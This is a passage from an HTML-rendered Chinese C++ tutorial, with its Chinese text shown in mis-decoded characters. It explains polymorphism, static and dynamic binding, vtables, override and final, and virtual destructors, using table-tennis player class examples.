<span class="comment">// *** rt2 å¼•ç”¨ RatedPlayer å¯¹è±¡ï¼Œè°ƒç”¨ RatedPlayer::Name() ***</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>ç¼–è¯‘å’Œè¿è¡Œ:</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">g++ usett1.cpp tabtenn1.cpp -o usett1</span><br><span class="line">./usett1</span><br></pre></td></tr></table></figure><p><strong>è¾“å‡º:</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">Direct call:</span><br><span class="line">Boomdea, Tara</span><br><span class="line">Duck, Mallory, Rating: 1140</span><br><span class="line"></span><br><span class="line">Using pointers to base type:</span><br><span class="line">Boomdea, Tara</span><br><span class="line">Duck, Mallory, Rating: 1140</span><br><span class="line"></span><br><span class="line">Using references to base type:</span><br><span class="line">Boomdea, Tara</span><br><span class="line">Duck, Mallory, Rating: 1140</span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°ï¼Œå½“é€šè¿‡åŸºç±»æŒ‡é’ˆ <code>pt2</code> æˆ–åŸºç±»å¼•ç”¨ <code>rt2</code> è°ƒç”¨è™šå‡½æ•° <code>Name()</code> æ—¶ï¼Œç¨‹åºåœ¨è¿è¡Œæ—¶æ£€æŸ¥åˆ°å®ƒä»¬å®é™…æŒ‡å‘/å¼•ç”¨çš„æ˜¯ <code>RatedPlayer</code> å¯¹è±¡ï¼Œå› æ­¤è°ƒç”¨äº† <code>RatedPlayer::Name()</code> ç‰ˆæœ¬ï¼Œå®ç°äº†å¤šæ€è¡Œä¸ºã€‚</p><p><strong>ä¸ºä»€ä¹ˆéœ€è¦å¤šæ€ï¼Ÿ</strong></p><p>å¤šæ€å…è®¸æˆ‘ä»¬ç¼–å†™æ›´é€šç”¨ã€æ›´çµæ´»çš„ä»£ç ã€‚ä¾‹å¦‚ï¼Œæˆ‘ä»¬å¯ä»¥åˆ›å»ºä¸€ä¸ªå‡½æ•°ï¼Œæ¥å—ä¸€ä¸ª <code>TableTennisPlayer</code> çš„æŒ‡é’ˆæˆ–å¼•ç”¨æ•°ç»„ï¼Œç„¶åéå†è¿™ä¸ªæ•°ç»„ï¼Œå¯¹æ¯ä¸ªå…ƒç´ è°ƒç”¨ <code>Name()</code> æ–¹æ³•ã€‚å³ä½¿æ•°ç»„ä¸­åŒ…å«ä¸åŒç±»å‹çš„çƒå‘˜ï¼ˆ<code>TableTennisPlayer</code>, <code>RatedPlayer</code> æˆ–å…¶ä»–æ´¾ç”Ÿç±»ï¼‰ï¼Œåªè¦ <code>Name()</code> æ˜¯è™šå‡½æ•°ï¼Œæ¯ä¸ªå¯¹è±¡éƒ½ä¼šä»¥è‡ªå·±æ­£ç¡®çš„æ–¹å¼æ˜¾ç¤ºå…¶åç§°å’Œä¿¡æ¯ã€‚</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">ShowPlayerInfo</span><span class="params">(<span class="keyword">const</span> TableTennisPlayer &amp; player)</span> </span>&#123;</span><br><span class="line">    player.Name(); <span class="comment">// ä¼šæ ¹æ® player å®é™…ç±»å‹è°ƒç”¨æ­£ç¡®çš„ Name() ç‰ˆæœ¬</span></span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// ... in main ...</span></span><br><span class="line">ShowPlayerInfo(player1);</span><br><span class="line">ShowPlayerInfo(rplayer1);</span><br></pre></td></tr></table></figure><p><strong>æ€»ç»“:</strong></p><ul><li>  <strong>å¤šæ€</strong>å…è®¸ä»¥ç»Ÿä¸€çš„æ–¹å¼å¤„ç†ä¸åŒç±»å‹çš„å¯¹è±¡ã€‚</li><li>  C++ é€šè¿‡<strong>å…¬æœ‰ç»§æ‰¿</strong>ã€<strong>è™šå‡½æ•° (<code>virtual</code>)</strong> å’Œ<strong>åŠ¨æ€è”ç¼–</strong>æ¥å®ç°å¤šæ€ã€‚</li><li>  åœ¨åŸºç±»ä¸­å°†å¸Œæœ›åœ¨æ´¾ç”Ÿç±»ä¸­é‡æ–°å®šä¹‰å¹¶å¸Œæœ›é€šè¿‡åŸºç±»æŒ‡é’ˆ/å¼•ç”¨è°ƒç”¨çš„æ–¹æ³•å£°æ˜ä¸º <code>virtual</code>ã€‚</li><li>  å½“é€šè¿‡åŸºç±»æŒ‡é’ˆæˆ–å¼•ç”¨è°ƒç”¨è™šå‡½æ•°æ—¶ï¼Œç¨‹åºåœ¨<strong>è¿è¡Œæ—¶</strong>æ ¹æ®å¯¹è±¡çš„å®é™…ç±»å‹ç¡®å®šè¦è°ƒç”¨çš„æ–¹æ³•ç‰ˆæœ¬ï¼ˆåŠ¨æ€è”ç¼–ï¼‰ã€‚</li><li>  å¦‚æœæœªä½¿ç”¨ <code>virtual</code>ï¼Œåˆ™æ ¹æ®æŒ‡é’ˆ/å¼•ç”¨çš„<strong>å£°æ˜ç±»å‹</strong>åœ¨<strong>ç¼–è¯‘æ—¶</strong>ç¡®å®šè°ƒç”¨ç‰ˆæœ¬ï¼ˆé™æ€è”ç¼–ï¼‰ã€‚</li><li>  å¤šæ€æ˜¯å®ç°ä»£ç çµæ´»æ€§å’Œå¯æ‰©å±•æ€§çš„å…³é”® OOP æŠ€æœ¯ã€‚</li></ul><h2 id="13-4-é™æ€è”ç¼–å’ŒåŠ¨æ€è”ç¼–"><a href="#13-4-é™æ€è”ç¼–å’ŒåŠ¨æ€è”ç¼–" class="headerlink" title="13.4 é™æ€è”ç¼–å’ŒåŠ¨æ€è”ç¼–"></a>13.4 é™æ€è”ç¼–å’ŒåŠ¨æ€è”ç¼–</h2><p><strong>è”ç¼– (Binding)</strong> æŒ‡çš„æ˜¯å°†æºä»£ç ä¸­çš„å‡½æ•°è°ƒç”¨ï¼ˆæˆ–æ–¹æ³•è°ƒç”¨ï¼‰ä¸å…¶åœ¨å¯æ‰§è¡Œä»£ç ä¸­çš„å…·ä½“å®ç°ï¼ˆå‡½æ•°ä½“ï¼‰å…³è”èµ·æ¥çš„è¿‡ç¨‹ã€‚C++ æ”¯æŒä¸¤ç§ç±»å‹çš„è”ç¼–ï¼šé™æ€è”ç¼–å’ŒåŠ¨æ€è”ç¼–ã€‚ç†è§£å®ƒä»¬çš„åŒºåˆ«å¯¹äºæŒæ¡å¤šæ€è‡³å…³é‡è¦ã€‚</p><h3 id="13-4-1-æŒ‡é’ˆå’Œå¼•ç”¨ç±»å‹çš„å…¼å®¹æ€§"><a href="#13-4-1-æŒ‡é’ˆå’Œå¼•ç”¨ç±»å‹çš„å…¼å®¹æ€§" class="headerlink" title="13.4.1 æŒ‡é’ˆå’Œå¼•ç”¨ç±»å‹çš„å…¼å®¹æ€§"></a>13.4.1 æŒ‡é’ˆå’Œå¼•ç”¨ç±»å‹çš„å…¼å®¹æ€§</h3><p>æˆ‘ä»¬å·²ç»çŸ¥é“ï¼Œåœ¨å…¬æœ‰ç»§æ‰¿ä¸‹ï¼ŒåŸºç±»æŒ‡é’ˆæˆ–å¼•ç”¨å¯ä»¥æŒ‡å‘æˆ–å¼•ç”¨æ´¾ç”Ÿç±»å¯¹è±¡ã€‚è¿™æ˜¯å®ç°å¤šæ€çš„å‰æã€‚</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// å‡è®¾ RatedPlayer å…¬æœ‰ç»§æ‰¿è‡ª TableTennisPlayer</span></span><br><span class="line">RatedPlayer rp;</span><br><span class="line">TableTennisPlayer * pt = &amp;rp; <span class="comment">// OK</span></span><br><span class="line">TableTennisPlayer &amp; rt = rp; <span class="comment">// OK</span></span><br></pre></td></tr></table></figure><p>è¿™ç§å‘ä¸Šè½¬æ¢ï¼ˆå°†æ´¾ç”Ÿç±»æŒ‡é’ˆ/å¼•ç”¨è½¬æ¢ä¸ºåŸºç±»æŒ‡é’ˆ/å¼•ç”¨ï¼‰æ˜¯è‡ªåŠ¨ä¸”å®‰å…¨çš„ï¼Œå› ä¸ºæ´¾ç”Ÿç±»å¯¹è±¡ä¿è¯åŒ…å«äº†åŸºç±»çš„æ‰€æœ‰æˆå‘˜å’Œæ¥å£ã€‚</p><p>åè¿‡æ¥ï¼Œå°†åŸºç±»æŒ‡é’ˆæˆ–å¼•ç”¨è½¬æ¢ä¸ºæ´¾ç”Ÿç±»æŒ‡é’ˆæˆ–å¼•ç”¨ï¼ˆå‘ä¸‹è½¬æ¢ï¼‰é€šå¸¸æ˜¯ä¸å®‰å…¨çš„ï¼Œéœ€è¦æ˜¾å¼ç±»å‹è½¬æ¢ï¼ˆå¦‚ <code>dynamic_cast</code>ï¼Œå°†åœ¨åé¢ç« èŠ‚è®¨è®ºï¼‰ï¼Œå¹¶ä¸”åªæœ‰åœ¨æŒ‡é’ˆ/å¼•ç”¨ç¡®å®æŒ‡å‘ä¸€ä¸ªæ´¾ç”Ÿç±»å¯¹è±¡æ—¶æ‰æœ‰æ•ˆã€‚</p><h3 id="13-4-2-è™šæˆå‘˜å‡½æ•°å’ŒåŠ¨æ€è”ç¼–"><a href="#13-4-2-è™šæˆå‘˜å‡½æ•°å’ŒåŠ¨æ€è”ç¼–" class="headerlink" title="13.4.2 è™šæˆå‘˜å‡½æ•°å’ŒåŠ¨æ€è”ç¼–"></a>13.4.2 è™šæˆå‘˜å‡½æ•°å’ŒåŠ¨æ€è”ç¼–</h3><p>ç°åœ¨è€ƒè™‘é€šè¿‡åŸºç±»æŒ‡é’ˆæˆ–å¼•ç”¨è°ƒç”¨æˆå‘˜å‡½æ•°ï¼š</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pt-&gt;SomeMethod();</span><br><span class="line">rt.SomeMethod();</span><br></pre></td></tr></table></figure><p>ç¼–è¯‘å™¨å¦‚ä½•å†³å®šè°ƒç”¨å“ªä¸ª <code>SomeMethod</code> çš„å®ç°ï¼ˆåŸºç±»çš„è¿˜æ˜¯æ´¾ç”Ÿç±»çš„ï¼‰ï¼Ÿè¿™å–å†³äº <code>SomeMethod</code> æ˜¯å¦æ˜¯<strong>è™šå‡½æ•°</strong>ä»¥åŠè”ç¼–æ–¹å¼ã€‚</p><p><strong>é™æ€è”ç¼– (Static Binding / Early Binding):</strong></p><ul><li>  <strong>ä½•æ—¶å‘ç”Ÿ:</strong> å½“è°ƒç”¨çš„å‡½æ•°<strong>ä¸æ˜¯</strong>è™šå‡½æ•°æ—¶ï¼Œæˆ–è€…å½“é€šè¿‡<strong>å¯¹è±¡æœ¬èº«</strong>ï¼ˆè€Œä¸æ˜¯æŒ‡é’ˆæˆ–å¼•ç”¨ï¼‰è°ƒç”¨å‡½æ•°æ—¶ï¼ˆæ— è®ºæ˜¯è™šå‡½æ•°è¿˜æ˜¯éè™šå‡½æ•°ï¼‰ã€‚</li><li>  <strong>å†³ç­–ä¾æ®:</strong> ç¼–è¯‘å™¨åœ¨<strong>ç¼–è¯‘æ—¶</strong>æ ¹æ®æŒ‡é’ˆæˆ–å¼•ç”¨çš„<strong>å£°æ˜ç±»å‹</strong>ï¼ˆé™æ€ç±»å‹ï¼‰æ¥å†³å®šè°ƒç”¨å“ªä¸ªå‡½æ•°ç‰ˆæœ¬ã€‚</li><li>  <strong>è¡Œä¸º:</strong> å³ä½¿åŸºç±»æŒ‡é’ˆ <code>pt</code> æŒ‡å‘ä¸€ä¸ªæ´¾ç”Ÿç±»å¯¹è±¡ <code>rp</code>ï¼Œå¦‚æœ <code>SomeMethod</code> ä¸æ˜¯è™šå‡½æ•°ï¼Œ<code>pt-&gt;SomeMethod()</code> ä»ç„¶ä¼šè°ƒç”¨<strong>åŸºç±»</strong>çš„ <code>SomeMethod</code> ç‰ˆæœ¬ã€‚</li><li>  <strong>æ•ˆç‡:</strong> é™æ€è”ç¼–æ•ˆç‡è¾ƒé«˜ï¼Œå› ä¸ºåœ¨ç¼–è¯‘æ—¶å°±å·²ç»ç¡®å®šäº†è¦è°ƒç”¨çš„å‡½æ•°åœ°å€ã€‚</li></ul><p><strong>åŠ¨æ€è”ç¼– (Dynamic Binding / Late Binding):</strong></p><ul><li>  <strong>ä½•æ—¶å‘ç”Ÿ:</strong> å½“é€šè¿‡<strong>åŸºç±»æŒ‡é’ˆæˆ–å¼•ç”¨</strong>è°ƒç”¨ä¸€ä¸ª<strong>è™šå‡½æ•° (<code>virtual</code>)</strong> æ—¶ã€‚</li><li>  <strong>å†³ç­–ä¾æ®:</strong> ç¨‹åºåœ¨<strong>è¿è¡Œæ—¶</strong>æ£€æŸ¥æŒ‡é’ˆæˆ–å¼•ç”¨<strong>å®é™…æŒ‡å‘çš„å¯¹è±¡ç±»å‹</strong>ï¼Œå¹¶è°ƒç”¨è¯¥å¯¹è±¡æ‰€å±ç±»çš„ç›¸åº”è™šå‡½æ•°ç‰ˆæœ¬ã€‚</li><li>  <strong>è¡Œä¸º:</strong> å¦‚æœåŸºç±»æŒ‡é’ˆ <code>pt</code> æŒ‡å‘ä¸€ä¸ªæ´¾ç”Ÿç±»å¯¹è±¡ <code>rp</code>ï¼Œå¹¶ä¸” <code>SomeMethod</code> æ˜¯è™šå‡½æ•°ï¼Œ<code>pt-&gt;SomeMethod()</code> ä¼šè°ƒç”¨<strong>æ´¾ç”Ÿç±»</strong>çš„ <code>SomeMethod</code> ç‰ˆæœ¬ã€‚è¿™å°±æ˜¯<strong>å¤šæ€</strong>çš„æ ¸å¿ƒã€‚</li><li>  <strong>å®ç°æœºåˆ¶ (æ¦‚å¿µä¸Š):</strong> ç¼–è¯‘å™¨é€šå¸¸ä¸ºåŒ…å«è™šå‡½æ•°çš„ç±»åˆ›å»ºä¸€ä¸ª**è™šå‡½æ•°è¡¨ (virtual function table, vtable)**ã€‚vtable æ˜¯ä¸€ä¸ªå­˜å‚¨è™šå‡½æ•°åœ°å€çš„æ•°ç»„ã€‚æ¯ä¸ªåŒ…å«è™šå‡½æ•°çš„ç±»çš„å¯¹è±¡å†…éƒ¨éƒ½æœ‰ä¸€ä¸ªéšè—çš„æŒ‡é’ˆï¼ˆé€šå¸¸ç§°ä¸º vptrï¼‰ï¼ŒæŒ‡å‘å…¶ç±»çš„ vtableã€‚å½“é€šè¿‡åŸºç±»æŒ‡é’ˆè°ƒç”¨è™šå‡½æ•°æ—¶ï¼Œç¨‹åºé€šè¿‡å¯¹è±¡çš„ vptr æ‰¾åˆ° vtableï¼Œç„¶ååœ¨ vtable ä¸­æŸ¥æ‰¾å¹¶è°ƒç”¨æ­£ç¡®çš„å‡½æ•°åœ°å€ã€‚è¿™ä¸ªæŸ¥æ‰¾è¿‡ç¨‹å‘ç”Ÿåœ¨è¿è¡Œæ—¶ã€‚</li><li>  <strong>æ•ˆç‡:</strong> åŠ¨æ€è”ç¼–æ¯”é™æ€è”ç¼–æœ‰è½»å¾®çš„è¿è¡Œæ—¶å¼€é”€ï¼ˆéœ€è¦æŸ¥æ‰¾ vtableï¼‰ï¼Œä½†åœ¨ç°ä»£å¤„ç†å™¨ä¸Šè¿™ç§å¼€é”€é€šå¸¸å¾ˆå°ï¼Œè€Œå®ƒå¸¦æ¥çš„çµæ´»æ€§æ˜¯å·¨å¤§çš„ã€‚</li></ul><p><strong>æ€»ç»“å¯¹æ¯”:</strong></p><table><thead><tr><th align="left">ç‰¹æ€§</th><th align="left">é™æ€è”ç¼– (Static Binding)</th><th align="left">åŠ¨æ€è”ç¼– (Dynamic Binding)</th></tr></thead><tbody><tr><td align="left"><strong>å‘ç”Ÿæ—¶é—´</strong></td><td align="left">ç¼–è¯‘æ—¶</td><td align="left">è¿è¡Œæ—¶</td></tr><tr><td align="left"><strong>è§¦å‘æ¡ä»¶</strong></td><td align="left">è°ƒç”¨éè™šå‡½æ•°ï¼Œæˆ–é€šè¿‡å¯¹è±¡è°ƒç”¨ä»»ä½•å‡½æ•°</td><td align="left">é€šè¿‡<strong>åŸºç±»æŒ‡é’ˆ/å¼•ç”¨</strong>è°ƒç”¨<strong>è™šå‡½æ•°</strong></td></tr><tr><td align="left"><strong>å†³ç­–ä¾æ®</strong></td><td align="left">æŒ‡é’ˆ/å¼•ç”¨çš„<strong>å£°æ˜ç±»å‹</strong> (é™æ€ç±»å‹)</td><td align="left">æŒ‡é’ˆ/å¼•ç”¨<strong>å®é™…æŒ‡å‘çš„å¯¹è±¡ç±»å‹</strong> (åŠ¨æ€ç±»å‹)</td></tr><tr><td align="left"><strong>è¡Œä¸º</strong></td><td align="left">è°ƒç”¨å£°æ˜ç±»å‹çš„å‡½æ•°ç‰ˆæœ¬</td><td align="left">è°ƒç”¨å®é™…å¯¹è±¡ç±»å‹çš„å‡½æ•°ç‰ˆæœ¬ (å¤šæ€)</td></tr><tr><td align="left"><strong>æœºåˆ¶</strong></td><td align="left">ç›´æ¥å‡½æ•°è°ƒç”¨</td><td align="left">é€šå¸¸é€šè¿‡è™šå‡½æ•°è¡¨ (vtable) å®ç°</td></tr><tr><td align="left"><strong>æ•ˆç‡</strong></td><td align="left">è¾ƒé«˜</td><td align="left">ç•¥ä½äºé™æ€è”ç¼–ï¼Œä½†é€šå¸¸å¯æ¥å—</td></tr></tbody></table><h3 id="13-4-3-æœ‰å…³è™šå‡½æ•°æ³¨æ„äº‹é¡¹"><a href="#13-4-3-æœ‰å…³è™šå‡½æ•°æ³¨æ„äº‹é¡¹" class="headerlink" title="13.4.3 æœ‰å…³è™šå‡½æ•°æ³¨æ„äº‹é¡¹"></a>13.4.3 æœ‰å…³è™šå‡½æ•°æ³¨æ„äº‹é¡¹</h3><p>ä¸ºäº†æ­£ç¡®ä½¿ç”¨è™šå‡½æ•°å’ŒåŠ¨æ€è”ç¼–ï¼Œéœ€è¦æ³¨æ„ä»¥ä¸‹å‡ ç‚¹ï¼š</p><ol><li><p> <strong>åœ¨åŸºç±»ä¸­å£°æ˜ <code>virtual</code>:</strong> å¿…é¡»åœ¨åŸºç±»ä¸­å°†å¸Œæœ›è¡¨ç°å‡ºå¤šæ€è¡Œä¸ºçš„å‡½æ•°å£°æ˜ä¸º <code>virtual</code>ã€‚</p></li><li><p> <strong>æ´¾ç”Ÿç±»è¦†ç›–:</strong> å¦‚æœæ´¾ç”Ÿç±»æä¾›äº†åŒåã€åŒå‚æ•°åˆ—è¡¨ï¼ˆåŒ…æ‹¬ <code>const</code> å±æ€§ï¼‰çš„æ–¹æ³•ï¼Œå®ƒå°†è‡ªåŠ¨è¦†ç›–ï¼ˆoverrideï¼‰åŸºç±»çš„è™šå‡½æ•°ã€‚è¿™ä¸ªæ´¾ç”Ÿç±»æ–¹æ³•ä¹Ÿè‡ªåŠ¨æˆä¸ºè™šå‡½æ•°ï¼Œæ— è®ºæ˜¯å¦æ˜¾å¼ä½¿ç”¨äº† <code>virtual</code> å…³é”®å­—ã€‚</p></li><li><p><strong><code>override</code> å…³é”®å­— (C++11):</strong> å¼ºçƒˆå»ºè®®åœ¨æ´¾ç”Ÿç±»è¦†ç›–è™šå‡½æ•°æ—¶ä½¿ç”¨ <code>override</code> å…³é”®å­—ã€‚è¿™ä¼šè®©ç¼–è¯‘å™¨æ£€æŸ¥è¯¥æ–¹æ³•æ˜¯å¦ç¡®å®è¦†ç›–äº†åŸºç±»ä¸­çš„æŸä¸ªè™šå‡½æ•°ã€‚å¦‚æœç­¾åä¸åŒ¹é…ï¼ˆä¾‹å¦‚ï¼Œå‚æ•°ç±»å‹ä¸åŒæˆ– <code>const</code> å±æ€§ä¸åŒï¼‰ï¼Œç¼–è¯‘å™¨ä¼šæŠ¥é”™ï¼Œå¸®åŠ©æ•è·æ½œåœ¨é”™è¯¯ã€‚</p> <figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Base</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">virtual</span> <span class="keyword">void</span> <span class="title">func</span><span class="params">(<span class="keyword">int</span>)</span> <span class="keyword">const</span></span>;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Derived</span> :</span> <span class="keyword">public</span> Base &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="comment">// virtual void func(int) override; // é”™è¯¯ï¼const å±æ€§ä¸åŒ¹é…</span></span><br><span class="line">    <span class="function"><span class="keyword">virtual</span> <span class="keyword">void</span> <span class="title">func</span><span class="params">(<span class="keyword">int</span>)</span> <span class="keyword">const</span> <span class="keyword">override</span></span>; <span class="comment">// æ­£ç¡®ï¼æ˜ç¡®è¦†ç›–</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></li><li><p><strong><code>final</code> å…³é”®å­— (C++11):</strong> å¦‚æœä¸å¸Œæœ›æŸä¸ªè™šå‡½æ•°åœ¨æ›´æ·±å±‚æ¬¡çš„æ´¾ç”Ÿç±»ä¸­è¢«è¿›ä¸€æ­¥è¦†ç›–ï¼Œå¯ä»¥åœ¨å…¶å£°æ˜ååŠ ä¸Š <code>final</code>ã€‚ä¹Ÿå¯ä»¥å°†æ•´ä¸ªç±»å£°æ˜ä¸º <code>final</code>ï¼Œé˜»æ­¢ä»»ä½•ç±»ä»å®ƒæ´¾ç”Ÿã€‚</p> <figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Base</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">virtual</span> <span class="keyword">void</span> <span class="title">func</span><span class="params">()</span> <span class="keyword">const</span></span>;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Derived</span> :</span> <span class="keyword">public</span> Base &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="comment">// è¦†ç›– funcï¼Œå¹¶ä¸”ä¸å…è®¸ Derived çš„å­ç±»å†è¦†ç›–å®ƒ</span></span><br><span class="line">    <span class="function"><span class="keyword">virtual</span> <span class="keyword">void</span> <span class="title">func</span><span class="params">()</span> <span class="keyword">const</span> <span class="keyword">override</span> <span class="keyword">final</span></span>;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MoreDerived</span> :</span> <span class="keyword">public</span> Derived &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="comment">// virtual void func() const override; // é”™è¯¯ï¼å› ä¸º Derived::func è¢«æ ‡è®°ä¸º final</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">CannotInherit</span> <span class="keyword">final</span> :</span> <span class="keyword">public</span> Base &#123; <span class="comment">// è¿™ä¸ªç±»ä¸èƒ½è¢«ç»§æ‰¿</span></span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="comment">// class Problem : public CannotInherit &#123;&#125;; // é”™è¯¯ï¼</span></span><br></pre></td></tr></table></figure></li><li><p> <strong>æ„é€ å‡½æ•°ä¸èƒ½æ˜¯è™šå‡½æ•°:</strong> å¯¹è±¡çš„ç±»å‹åœ¨æ„é€ å®Œæˆä¹‹å‰æ˜¯æœªç¡®å®šçš„ï¼Œå› æ­¤æ„é€ å‡½æ•°æ— æ³•å®ç°åŠ¨æ€è”ç¼–ã€‚</p></li><li><p><strong>ææ„å‡½æ•°åº”è¯¥æ˜¯è™šå‡½æ•°:</strong> å¦‚æœä¸€ä¸ªç±»æ‰“ç®—ä½œä¸ºåŸºç±»ï¼ˆç‰¹åˆ«æ˜¯å¦‚æœå¯èƒ½é€šè¿‡åŸºç±»æŒ‡é’ˆ <code>delete</code> æ´¾ç”Ÿç±»å¯¹è±¡ï¼‰ï¼Œé‚£ä¹ˆå®ƒçš„ææ„å‡½æ•°<strong>åº”è¯¥</strong>å£°æ˜ä¸ºè™šå‡½æ•° (<code>virtual ~Base();</code>)ã€‚</p><ul><li>  <strong>åŸå› :</strong> è€ƒè™‘ <code>Base *p = new Derived; delete p;</code>ã€‚å¦‚æœ <code>~Base()</code> ä¸æ˜¯è™šå‡½æ•°ï¼Œ<code>delete p;</code> åªä¼šè°ƒç”¨ <code>~Base()</code>ï¼Œæ´¾ç”Ÿç±» <code>Derived</code> çš„ææ„å‡½æ•° <code>~Derived()</code> å°†<strong>ä¸ä¼š</strong>è¢«è°ƒç”¨ï¼Œå¯èƒ½å¯¼è‡´æ´¾ç”Ÿç±»åˆ†é…çš„èµ„æºï¼ˆå¦‚åŠ¨æ€å†…å­˜ï¼‰æ³„æ¼ã€‚å¦‚æœ <code>~Base()</code> æ˜¯è™šå‡½æ•°ï¼Œ<code>delete p;</code> ä¼šé€šè¿‡åŠ¨æ€è”ç¼–æ­£ç¡®åœ°è°ƒç”¨ <code>~Derived()</code>ï¼Œç„¶åå†è°ƒç”¨ <code>~Base()</code>ï¼Œç¡®ä¿æ‰€æœ‰èµ„æºéƒ½è¢«é‡Šæ”¾ã€‚</li><li>  <strong>è§„åˆ™:</strong> å¦‚æœç±»ä¸­æœ‰ä»»ä½•è™šå‡½æ•°ï¼Œé€šå¸¸å°±åº”è¯¥æä¾›ä¸€ä¸ªè™šææ„å‡½æ•°ã€‚å³ä½¿åŸºç±»ææ„å‡½æ•°ä»€ä¹ˆä¹Ÿä¸åšï¼Œä¹Ÿåº”å°†å…¶å£°æ˜ä¸º <code>virtual</code>ã€‚</li></ul></li><li><p> <strong>å‹å…ƒå‡½æ•°ä¸èƒ½æ˜¯è™šå‡½æ•°:</strong> å‹å…ƒå‡½æ•°ä¸æ˜¯ç±»çš„æˆå‘˜å‡½æ•°ï¼Œç»§æ‰¿æœºåˆ¶ä¸é€‚ç”¨äºå®ƒä»¬ã€‚</p></li><li><p> <strong>é™æ€æˆå‘˜å‡½æ•°ä¸èƒ½æ˜¯è™šå‡½æ•°:</strong> é™æ€æˆå‘˜å‡½æ•°ä¸ç±»æœ¬èº«å…³è”ï¼Œè€Œä¸æ˜¯ä¸ç‰¹å®šå¯¹è±¡å…³è”ï¼ˆæ²¡æœ‰ <code>this</code> æŒ‡é’ˆï¼‰ï¼Œå› æ­¤åŠ¨æ€è”ç¼–å¯¹å…¶æ²¡æœ‰æ„ä¹‰ã€‚</p></li></ol><p>ç†è§£é™æ€è”ç¼–å’ŒåŠ¨æ€è”ç¼–çš„åŒºåˆ«ï¼Œä»¥åŠä½•æ—¶ã€å¦‚ä½•ä½¿ç”¨è™šå‡½æ•°ï¼Œæ˜¯æŒæ¡ C++ å¤šæ€ç‰¹æ€§å’Œç¼–å†™å¥å£®ã€å¯æ‰©å±•çš„é¢å‘å¯¹è±¡ä»£ç çš„å…³é”®ã€‚</p><h2 id="13-5-è®¿é—®æ§åˆ¶ï¼šprotected"><a href="#13-5-è®¿é—®æ§åˆ¶ï¼šprotected" class="headerlink" title="13.5 è®¿é—®æ§åˆ¶ï¼šprotected"></a>13.5 è®¿é—®æ§åˆ¶ï¼šprotected</h2><p>åˆ°ç›®å‰ä¸ºæ­¢ï¼Œæˆ‘ä»¬ä½¿ç”¨äº† <code>public</code> å’Œ <code>private</code> è®¿é—®è¯´æ˜ç¬¦æ¥æ§åˆ¶å¯¹ç±»æˆå‘˜çš„è®¿é—®ã€‚</p><ul><li>  <code>public</code> æˆå‘˜å¯ä»¥è¢«ä»»ä½•åœ°æ–¹çš„ä»£ç è®¿é—®ã€‚</li><li>  <code>private</code> æˆå‘˜åªèƒ½è¢«å®šä¹‰å®ƒä»¬çš„ç±»çš„æˆå‘˜å‡½æ•°ï¼ˆä»¥åŠå‹å…ƒï¼‰è®¿é—®ã€‚</li></ul><p>åœ¨ç»§æ‰¿çš„èƒŒæ™¯ä¸‹ï¼Œ<code>private</code> æˆå‘˜æœ‰ä¸€ä¸ªé‡è¦çš„é™åˆ¶ï¼š<strong>åŸºç±»çš„ <code>private</code> æˆå‘˜ä¸èƒ½è¢«æ´¾ç”Ÿç±»çš„æˆå‘˜å‡½æ•°ç›´æ¥è®¿é—®</strong>ã€‚æ´¾ç”Ÿç±»éœ€è¦é€šè¿‡åŸºç±»çš„ <code>public</code> æˆ– 